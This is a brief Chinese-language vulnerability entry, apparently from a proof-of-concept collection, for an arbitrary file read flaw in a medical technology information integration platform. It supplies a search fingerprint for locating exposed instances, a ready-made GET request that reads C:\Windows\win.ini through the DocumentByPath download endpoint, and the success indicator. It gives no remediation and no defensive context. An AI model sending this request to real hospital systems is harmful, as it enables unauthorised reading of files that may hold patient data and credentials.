# 医技信息集成平台DocumentByPath存在任意文件读取漏洞

医技信息集成平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="IMCISClient"`
- **请求**：`GET /DocumentService/Download/DocumentByPath?path=C:\Windows\win.ini HTTP/1.1`
- **响应特征**：200